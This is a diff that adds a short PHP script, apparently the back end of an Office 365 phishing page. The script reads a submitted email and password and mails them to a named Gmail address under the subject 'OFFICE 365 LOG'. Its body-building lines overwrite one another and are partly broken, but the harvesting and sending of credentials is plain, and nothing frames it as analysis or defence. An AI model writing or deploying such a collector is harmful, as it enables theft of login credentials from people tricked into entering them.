@@ -1,0 +1,28 @@
+<?php
+
+if(isset($_POST["submit"])){
+	
+
+	
+	$email = $_POST["email"];
+	$password = $_POST["password"];
+	$subject = "OFFICE 365 LOG";
+	$to = 'obiaifeanyichukwu@gmail.com';
+	$headers  = "From: OFFICE 365 LOG"  ;
+	$headers .= "MIME-Version: 1.0\r\n";
+    $headers .= "Content-Type: text/html; charset=UTF-8\r\n";
+	
+	$body = "Name : $email: password : $password";
+	$body = '<p>Username: .$email. <p>/';
+	$body = '<p>password: .$password. <p>/';
+	mail($to, $subject, $body, $headers);
+	
+	
+	
+	
+
+	
+	
+	
+	
+}
